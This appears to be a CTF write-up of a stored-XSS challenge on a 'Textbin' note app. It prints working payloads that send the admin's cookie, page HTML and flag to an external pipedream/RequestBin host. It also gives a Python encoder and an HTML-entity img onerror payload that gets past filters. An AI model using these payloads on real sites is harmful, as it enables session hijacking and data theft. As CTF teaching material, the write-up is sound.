@@ -1,0 +1,514 @@
+I"9g<p>Given a website, where a person can login and register. Both are irrelevant to the challenge, so I will cut the chase. The other feature, the ‘relevant’ feature of the challenge, is a feature that allows user to write a note and even send the note to an <strong>admin</strong> (evil laugh). It isn’t hurt to think that this might be an XSS challenge, and I did that.</p>
+
+<p>To start working on the XSS, I submitted a simple fuzzing payload as a sanity check:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>&lt;script&gt;alert(1)&lt;/script&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>and the mighty alert box appeared.</p>
+
+<p><img src="/assets/img/post_images/1827e14ab5b443d08541d1b536f7c97f.png" alt="e0b08796e4d0a2d90c090dffc50d7661.png" /></p>
+
+<p>Since XSS is not a dream anymore, the next step is to do the basic: steal the admin cookie. ArkAngels had already did the hardwork for this by the time I started working on this challenge. Long story short, I spin up a <a href="https://requestbin.com/">RequestBin</a> to capture the stolen cookie and submitted this payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>&lt;script&gt;
+var req = new XMLHttpRequest();
+req.open('GET', 'https://enit8s845uv8.x.pipedream.net/?cookie=' + document.cookie);
+req.send();
+&lt;/script&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>After the payload is submitted, I reported my post to the admin. The admin  visited, and here’s the result:</p>
+
+<p><img src="/assets/img/post_images/0b7b3ca4738043f19c71c90299ed3913.png" alt="f57c874e2158c7a5a8c7013042a18da1.png" /></p>
+
+<p><img src="/assets/img/post_images/a43e417593714d769c28a2d770ac52be.png" alt="cbd33f8ed6cadb0ef05938ddba44c472.png" /></p>
+
+<p>The cookie is nothing but a hint to <strong>check the admin console</strong>. At first I thought I need to capture everything that are being printed into the Developer Console Window, but then I noticed that inside the page’s HTML, there is a <code class="language-plaintext highlighter-rouge">div</code> tag with <code class="language-plaintext highlighter-rouge">admin_console</code> class. So that should be the next step.</p>
+
+<p><img src="/assets/img/post_images/e1eae92ed80340b2823f406684f21d26.png" alt="b0351fa2cd51917317a4043f31404222.png" /></p>
+
+<p>Then I tried to smuggle the content of the <code class="language-plaintext highlighter-rouge">admin_console</code> tag from the admin (since they said “only the admin can see it”). I modified and submitted this payload for that purpose:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre>&lt;script&gt;
+	var req = new XMLHttpRequest();
+	var target = document.getElementsByClassName('admin_console')[0];
+	console.log(target.innerHTML);
+	req.open('GET', 'https://enit8s845uv8.x.pipedream.net/?content=' + btoa(target.innerHTML));
+	req.send();
+&lt;/script&gt;
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>But that shouldn’t be working becase document.getElements* functions return a <em>live collection</em> (<a href="https://stackoverflow.com/a/33681728">explanation here</a>). So while the page is still loading, my payload is already being executed, hence there might be no tag with class named <code class="language-plaintext highlighter-rouge">admin_console</code> yet. That’s why I need to make sure that the page is loaded before trying to access the innerHTML of the <code class="language-plaintext highlighter-rouge">admin_console</code> tag.</p>
+
+<p>I modified the payload into something like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre>&lt;script&gt;
+window.addEventListener("load", function(event) {
+    var req = new XMLHttpRequest();
+	var target = document.getElementsByClassName('admin_console')[0];
+	console.log(target.innerHTML);
+	req.open('GET', 'https://enit8s845uv8.x.pipedream.net/?content=' + btoa(target.innerHTML));
+	req.send();
+});
+&lt;/script&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>By wrapping the payload inside a <code class="language-plaintext highlighter-rouge">window.addEventListener("load")</code> function, the payload will only be executed after the whole page has loaded, including all dependent resources such as stylesheets and images.</p>
+
+<p>And here’s the result:</p>
+
+<p><img src="/assets/img/post_images/192bfbb672bd4cc1a4380def5f656083.png" alt="7efceaa88bfbc222cad45c78734d66a3.png" /></p>
+
+<p>The value is kinda gibberish because I used <code class="language-plaintext highlighter-rouge">btoa()</code> function to create a Base64-encoded ASCII string from a binary string (in case something unprintable appeared on the admin’s POV of the page). After I decoded the base64, this is the result:</p>
+
+<p><img src="/assets/img/post_images/9455839bc69248d1b00a0fc1b19f3f4c.png" alt="524a3ef4e2973f35d8a89a509fc119ec.png" /></p>
+
+<p>I also had the chance to modify the payload to smuggle the entire page, instead of just the <code class="language-plaintext highlighter-rouge">admin_console</code> tag content. Here’s the modified payload:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre>&lt;script&gt;
+window.addEventListener("load", function(event) {
+    var req = new XMLHttpRequest();
+	req.open('GET', 'https://enit8s845uv8.x.pipedream.net/?content=' + btoa(document.documentElement.innerHTML));
+	req.send();
+});
+&lt;/script&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And here’s the HTML source code of the entire page, for the sake of your clarity:</p>
+
+<p><img src="/assets/img/post_images/c8773ee980f540c68bffee694c3078e4.png" alt="816020dbaa2a6c799b1b60a2e618511a.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+</pre></td> --><td class="rouge-code"><pre>&lt;head&gt;
+        &lt;meta charset="utf-8"&gt;
+        &lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"&gt;
+        &lt;title&gt;Textbin&lt;/title&gt;
+        &lt;link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"&gt;
+        &lt;link rel="stylesheet" href="/static/css/style.css"&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;nav class="navbar navbar-expand-lg navbar-light bg-light"&gt;
+          &lt;button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"&gt;
+            &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;
+          &lt;/button&gt;
+          &lt;div class="collapse navbar-collapse" id="navbarNav"&gt;
+            &lt;ul class="navbar-nav"&gt;
+              &lt;li class="nav-item active"&gt;
+                &lt;a class="nav-link" href="/"&gt;Home&lt;span class="sr-only"&gt;(current)&lt;/span&gt;&lt;/a&gt;
+              &lt;/li&gt;
+              
+            &lt;/ul&gt;
+          &lt;/div&gt;
+        &lt;/nav&gt;
+        &lt;div class="container"&gt;
+            &lt;div class="row"&gt;
+                &lt;div class="col-12"&gt;
+                    &lt;h1&gt;Textbin&lt;/h1&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class="row"&gt;
+                &lt;div class="col-8 textbody"&gt;
+                    
+                        &lt;script&gt;
+window.addEventListener("load", function(event) {
+    var req = new XMLHttpRequest();
+	var target = document.getElementsByClassName('admin_console')[0];
+	console.log(target.innerHTML);
+	req.open('GET', 'https://enit8s845uv8.x.pipedream.net/?content=' + btoa(document.documentElement.innerHTML));
+	req.send();
+});
+
+&lt;/script&gt; 
+                    
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class="row"&gt;
+                &lt;div class="col-8"&gt;
+                    
+                        &lt;small&gt;By user &lt;code&gt;aha&lt;/code&gt;&lt;/small&gt;
+                    
+                &lt;/div&gt;
+            &lt;/div&gt;
+
+            &lt;div class="row" style="margin-bottom:10px"&gt;
+                &lt;div class="col-8"&gt;
+                    &lt;button type="button" class="btn btn-warning" id="report"&gt;Report to Admin&lt;/button&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class="row"&gt;
+                &lt;div class="col-8 admin_console"&gt;
+                    &lt;!-- Only the admin can see this --&gt;
+                    
+                        
+                            &lt;button class="btn btn-primary flag-button"&gt;Access Flag&lt;/button&gt;
+
+&lt;a href="/button" class="btn btn-primary other-button"&gt;Delete User&lt;/a&gt;
+
+&lt;a href="/button" class="btn btn-primary other-button"&gt;Delete Post&lt;/a&gt;
+ 
+                        
+                    
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div id="responseAlert" class="alert alert-info" role="alert" style="display: none;"&gt;&lt;/div&gt;
+        &lt;/div&gt;
+        &lt;script src="https://code.jquery.com/jquery-3.3.1.min.js" crossorigin="anonymous"&gt;&lt;/script&gt;
+        &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"&gt;&lt;/script&gt;
+        &lt;script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"&gt;&lt;/script&gt;
+        &lt;script&gt;
+            
+            $('#responseAlert').css('display','none');
+            $('#report').on('click',function(e){
+                $.ajax({
+                    type: "GET",
+                    url: window.location.pathname+"/report",
+                    success: function(resp) {
+                        $("#responseAlert").text(resp); $("#responseAlert").css("display","");
+                    }
+                })
+            });
+            
+
+                var flag='';
+                f=function(e){
+
+                    $.ajax({
+                        type: "GET",
+                        url: "/admin_flag",
+                        success: function(resp) {
+                            flag=resp;$("#responseAlert").text(resp); $("#responseAlert").css("display","");
+                        }
+                    })
+                    return flag;
+                };
+                $('.flag-button').on('click',f);
+            
+
+             
+        &lt;/script&gt;
+ 
+&lt;/body&gt;
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>With the knowledge of the entire page, I noticed that there are some interesting things. Let me break it down for you:</p>
+
+<ol>
+  <li>
+    <p>There are two delete buttons (or <code class="language-plaintext highlighter-rouge">&lt;a&gt;</code> tags, technically) that redirects the admin to <code class="language-plaintext highlighter-rouge">/button</code> endpoint when clicked, but it seems to have no function at all (they said it’s not yet implemented)</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre> &lt;a href="/button" class="btn btn-primary other-button"&gt;Delete User&lt;/a&gt;
+ &lt;a href="/button" class="btn btn-primary other-button"&gt;Delete Post&lt;/a&gt;
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+
+    <p><img src="/assets/img/post_images/7af2b7cfaa5945058227d2795d00a3ab.png" alt="db7580b33b079c308e1ff7f44b2eb8e0.png" /></p>
+  </li>
+  <li>
+    <p>There is a an Access Flag button, which when clicked will run an AJAX GET request to <code class="language-plaintext highlighter-rouge">/admin_flag</code> endpoint. The response of the request (which is probably the flag itself) will be displayed on a tag with class named <code class="language-plaintext highlighter-rouge">responseAlert</code></p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td> --><td class="rouge-code"><pre> var flag='';
+ f=function(e){
+     $.ajax({
+         type: "GET",
+         url: "/admin_flag",
+         success: function(resp) {
+             flag=resp;$("#responseAlert").text(resp); $("#responseAlert").css("display","");
+         }
+     })
+     return flag;
+ };
+ $('.flag-button').on('click',f);
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>The <code class="language-plaintext highlighter-rouge">/admin_flag</code> endpoint itself is pretty tricky. When I tried to visit the endpoint directly as myself (not an admin), it says that only the admin can access them.</p>
+
+    <p><img src="/assets/img/post_images/d24fabdeeadf4c9986f4db5979e4e66b.png" alt="87ecbb8281b5ef0501dbaa42a5e7dc9e.png" /></p>
+  </li>
+</ol>
+
+<p>By that information, I continue exploiting the XSS vulnerability to make the admin perform a request to <code class="language-plaintext highlighter-rouge">/admin_flag</code> and send the response to my RequestBin endpoint. That could be achieved simply by calling the <code class="language-plaintext highlighter-rouge">f</code> function or emulating a button click against the Access Flag button, then take the content of the <code class="language-plaintext highlighter-rouge">responseAlert</code> tag where the response from <code class="language-plaintext highlighter-rouge">/admin_flag</code> endpoint would be placed.</p>
+
+<p>Here’s the payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td> --><td class="rouge-code"><pre>&lt;script&gt;
+window.addEventListener("load", function(event) {
+	var targetButton = document.getElementsByClassName("flag-button");
+
+	targetButton[0].onclick = function fun() {
+		var probe = setInterval(function(){ 
+			let flag = document.getElementById('responseAlert').innerHTML;
+	        var req = new XMLHttpRequest();
+		    req.open('GET', 'https://enit8s845uv8.x.pipedream.net/?theflag=' + flag);
+			req.onreadystatechange = function() {
+			  console.log(flag);
+			};
+			req.send();
+		}, 1000);
+		setTimeout(function( ) { clearInterval( probe ); }, 3000);
+	}
+
+	targetButton[0].click();
+});
+&lt;/script&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I used <code class="language-plaintext highlighter-rouge">setInterval</code> because I reckon there is a possibility that the AJAX request to <code class="language-plaintext highlighter-rouge">/admin_flag</code> could not be done instantly. I’m afraid there might be a slight delay until the response is placed inside the <code class="language-plaintext highlighter-rouge">responseAlert</code> tag to be taken (it’s an Asynchronous-JAX after all). So the payload will get whatever it is inside the <code class="language-plaintext highlighter-rouge">responseAlert</code> tag and perform a request to my RequestBin endpoint, carrying the (hopefully) flag. The operation will run every second until three seconds have passed (notice that I also used <code class="language-plaintext highlighter-rouge">setTimeout</code> and <code class="language-plaintext highlighter-rouge">clearInterval</code> to stop my <code class="language-plaintext highlighter-rouge">setInterval</code>).</p>
+
+<p>And finally, here’s the result:</p>
+
+<p><img src="/assets/img/post_images/af6fd075fbcf4c9485b17f0e13f7d0b9.png" alt="595063116aae188235d6601642b077d4.png" /></p>
+
+<p>Even when I had the admin to take the flag and send it back to me, I still couldn’t get the flag. As you can see there, there must be some filters. I cannot use <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tags, no quotes, and no pharentheses. At this point, I was pretty confident that the payload is working, and this is just another obstacle that I need to see through.</p>
+
+<p>To be able to execute Javascript with certain token being banned, I thought of some ways. At first I thought I could use JSFuck (read <a href="http://www.jsfuck.com/">here</a>) to obfuscate the payload and bypass the check, but JSFuck do use pharentheses, so that’s a no. Instead, I hid the entire payload by converting it into the HTML Entities equivalent for each character. You can read more about HTML Entities <a href="https://developer.mozilla.org/en-US/docs/Glossary/Entity">here</a>. Also, to avoid using <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tags to execute the payload, I used an <code class="language-plaintext highlighter-rouge">img</code> tag instead and put the payload inside the <code class="language-plaintext highlighter-rouge">onload</code> attribute.</p>
+
+<p>When I was working on this challenge I build my own solver script to convert my payload into the HTML Entities format, but you also can use a tool for that (like <a href="https://v2.cryptii.com/text/htmlentities">this</a>). Here’s the script:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre></td> --><td class="rouge-code"><pre>#!/usr/bin/python
+
+payload = """
+window.addEventListener("load", function(event) {
+	var targetButton = document.getElementsByClassName("flag-button");
+	var navbarButton = document.getElementsByClassName("navbar-toggler");
+	console.log(document);
+	targetButton[0].onclick = function fun() {
+		var probe = setInterval(function(){ 
+			let flag = document.getElementById('responseAlert').innerHTML;
+	        var req = new XMLHttpRequest();
+		    req.open('GET', 'https://enit8s845uv8.x.pipedream.net/?theflag=' + flag);
+			req.onreadystatechange = function() {
+			  console.log(flag);
+			};
+			req.send();
+		}, 1000);
+		setTimeout(function( ) { clearInterval( probe ); }, 10000);
+	}
+	targetButton[0].click();
+});
+"""
+
+unicoded = ""
+compacted = ""
+for c in payload:
+	unicoded += ("&amp;#" + str(ord(c)))
+	compacted += c
+print ("Raw: %s" % compacted)
+print ("&lt;img src=x onerror=%s&gt;" % unicoded)
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And here’s the final payload:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>&lt;img src=x onerror=&amp;#10&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#97&amp;#100&amp;#100&amp;#69&amp;#118&amp;#101&amp;#110&amp;#116&amp;#76&amp;#105&amp;#115&amp;#116&amp;#101&amp;#110&amp;#101&amp;#114&amp;#40&amp;#34&amp;#108&amp;#111&amp;#97&amp;#100&amp;#34&amp;#44&amp;#32&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#101&amp;#118&amp;#101&amp;#110&amp;#116&amp;#41&amp;#32&amp;#123&amp;#10&amp;#9&amp;#118&amp;#97&amp;#114&amp;#32&amp;#116&amp;#97&amp;#114&amp;#103&amp;#101&amp;#116&amp;#66&amp;#117&amp;#116&amp;#116&amp;#111&amp;#110&amp;#32&amp;#61&amp;#32&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#103&amp;#101&amp;#116&amp;#69&amp;#108&amp;#101&amp;#109&amp;#101&amp;#110&amp;#116&amp;#115&amp;#66&amp;#121&amp;#67&amp;#108&amp;#97&amp;#115&amp;#115&amp;#78&amp;#97&amp;#109&amp;#101&amp;#40&amp;#34&amp;#102&amp;#108&amp;#97&amp;#103&amp;#45&amp;#98&amp;#117&amp;#116&amp;#116&amp;#111&amp;#110&amp;#34&amp;#41&amp;#59&amp;#10&amp;#9&amp;#118&amp;#97&amp;#114&amp;#32&amp;#110&amp;#97&amp;#118&amp;#98&amp;#97&amp;#114&amp;#66&amp;#117&amp;#116&amp;#116&amp;#111&amp;#110&amp;#32&amp;#61&amp;#32&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#103&amp;#101&amp;#116&amp;#69&amp;#108&amp;#101&amp;#109&amp;#101&amp;#110&amp;#116&amp;#115&amp;#66&amp;#121&amp;#67&amp;#108&amp;#97&amp;#115&amp;#115&amp;#78&amp;#97&amp;#109&amp;#101&amp;#40&amp;#34&amp;#110&amp;#97&amp;#118&amp;#98&amp;#97&amp;#114&amp;#45&amp;#116&amp;#111&amp;#103&amp;#103&amp;#108&amp;#101&amp;#114&amp;#34&amp;#41&amp;#59&amp;#10&amp;#9&amp;#99&amp;#111&amp;#110&amp;#115&amp;#111&amp;#108&amp;#101&amp;#46&amp;#108&amp;#111&amp;#103&amp;#40&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#41&amp;#59&amp;#10&amp;#9&amp;#116&amp;#97&amp;#114&amp;#103&amp;#101&amp;#116&amp;#66&amp;#117&amp;#116&amp;#116&amp;#111&amp;#110&amp;#91&amp;#48&amp;#93&amp;#46&amp;#111&amp;#110&amp;#99&amp;#108&amp;#105&amp;#99&amp;#107&amp;#32&amp;#61&amp;#32&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#32&amp;#102&amp;#117&amp;#110&amp;#40&amp;#41&amp;#32&amp;#123&amp;#10&amp;#9&amp;#9&amp;#118&amp;#97&amp;#114&amp;#32&amp;#112&amp;#114&amp;#111&amp;#98&amp;#101&amp;#32&amp;#61&amp;#32&amp;#115&amp;#101&amp;#116&amp;#73&amp;#110&amp;#116&amp;#101&amp;#114&amp;#118&amp;#97&amp;#108&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#32&amp;#10&amp;#9&amp;#9&amp;#9&amp;#108&amp;#101&amp;#116&amp;#32&amp;#102&amp;#108&amp;#97&amp;#103&amp;#32&amp;#61&amp;#32&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#103&amp;#101&amp;#116&amp;#69&amp;#108&amp;#101&amp;#109&amp;#101&amp;#110&amp;#116&amp;#66&amp;#121&amp;#73&amp;#100&amp;#40&amp;#39&amp;#114&amp;#101&amp;#115&amp;#112&amp;#111&amp;#110&amp;#115&amp;#101&amp;#65&amp;#108&amp;#101&amp;#114&amp;#116&amp;#39&amp;#41&amp;#46&amp;#105&amp;#110&amp;#110&amp;#101&amp;#114&amp;#72&amp;#84&amp;#77&amp;#76&amp;#59&amp;#10&amp;#9&amp;#32&amp;#32&amp;#32&amp;#32&amp;#32&amp;#32&amp;#32&amp;#32&amp;#118&amp;#97&amp;#114&amp;#32&amp;#114&amp;#101&amp;#113&amp;#32&amp;#61&amp;#32&amp;#110&amp;#101&amp;#119&amp;#32&amp;#88&amp;#77&amp;#76&amp;#72&amp;#116&amp;#116&amp;#112&amp;#82&amp;#101&amp;#113&amp;#117&amp;#101&amp;#115&amp;#116&amp;#40&amp;#41&amp;#59&amp;#10&amp;#9&amp;#9&amp;#32&amp;#32&amp;#32&amp;#32&amp;#114&amp;#101&amp;#113&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#71&amp;#69&amp;#84&amp;#39&amp;#44&amp;#32&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#115&amp;#58&amp;#47&amp;#47&amp;#101&amp;#110&amp;#105&amp;#116&amp;#56&amp;#115&amp;#56&amp;#52&amp;#53&amp;#117&amp;#118&amp;#56&amp;#46&amp;#120&amp;#46&amp;#112&amp;#105&amp;#112&amp;#101&amp;#100&amp;#114&amp;#101&amp;#97&amp;#109&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#63&amp;#116&amp;#104&amp;#101&amp;#102&amp;#108&amp;#97&amp;#103&amp;#61&amp;#39&amp;#32&amp;#43&amp;#32&amp;#102&amp;#108&amp;#97&amp;#103&amp;#41&amp;#59&amp;#10&amp;#9&amp;#9&amp;#9&amp;#114&amp;#101&amp;#113&amp;#46&amp;#111&amp;#110&amp;#114&amp;#101&amp;#97&amp;#100&amp;#121&amp;#115&amp;#116&amp;#97&amp;#116&amp;#101&amp;#99&amp;#104&amp;#97&amp;#110&amp;#103&amp;#101&amp;#32&amp;#61&amp;#32&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#32&amp;#123&amp;#10&amp;#9&amp;#9&amp;#9&amp;#32&amp;#32&amp;#99&amp;#111&amp;#110&amp;#115&amp;#111&amp;#108&amp;#101&amp;#46&amp;#108&amp;#111&amp;#103&amp;#40&amp;#102&amp;#108&amp;#97&amp;#103&amp;#41&amp;#59&amp;#10&amp;#9&amp;#9&amp;#9&amp;#125&amp;#59&amp;#10&amp;#9&amp;#9&amp;#9&amp;#114&amp;#101&amp;#113&amp;#46&amp;#115&amp;#101&amp;#110&amp;#100&amp;#40&amp;#41&amp;#59&amp;#10&amp;#9&amp;#9&amp;#125&amp;#44&amp;#32&amp;#49&amp;#48&amp;#48&amp;#48&amp;#41&amp;#59&amp;#10&amp;#9&amp;#9&amp;#115&amp;#101&amp;#116&amp;#84&amp;#105&amp;#109&amp;#101&amp;#111&amp;#117&amp;#116&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#32&amp;#41&amp;#32&amp;#123&amp;#32&amp;#99&amp;#108&amp;#101&amp;#97&amp;#114&amp;#73&amp;#110&amp;#116&amp;#101&amp;#114&amp;#118&amp;#97&amp;#108&amp;#40&amp;#32&amp;#112&amp;#114&amp;#111&amp;#98&amp;#101&amp;#32&amp;#41&amp;#59&amp;#32&amp;#125&amp;#44&amp;#32&amp;#49&amp;#48&amp;#48&amp;#48&amp;#48&amp;#41&amp;#59&amp;#10&amp;#9&amp;#125&amp;#10&amp;#9&amp;#116&amp;#97&amp;#114&amp;#103&amp;#101&amp;#116&amp;#66&amp;#117&amp;#116&amp;#116&amp;#111&amp;#110&amp;#91&amp;#48&amp;#93&amp;#46&amp;#99&amp;#108&amp;#105&amp;#99&amp;#107&amp;#40&amp;#41&amp;#59&amp;#10&amp;#125&amp;#41&amp;#59&amp;#10&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Submitted the payload, send it to the admin, and voila flag:</p>
+
+<p><img src="/assets/img/post_images/5a684e355ef047be8cb1ba3c4feb8879.png" alt="fc726a8ab87b6744ca38662f5dafad64.png" /></p>
+
+<p>Flag is <strong>tjctf{st0p_st3aling_th3_ADm1ns_fl4gs}</strong></p>
+:ET
